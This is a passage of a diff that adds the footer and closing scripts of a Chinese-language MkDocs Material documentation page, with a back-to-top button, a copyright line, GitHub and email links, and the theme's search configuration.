+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; W anjv
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/anjvW" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="ber762631@gmail.com" target="_blank" rel="noopener" title="Email" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m20 8-8 5-8-5V6l8 5 8-5m0-2H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tracking", "navigation.sections", "navigation.prune", "toc.follow", "navigation.top", "search.suggest", "search.highlight", "search.share", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.8fd75fb4.min.js"></script>
+      
+    
+  </body>
+</html>
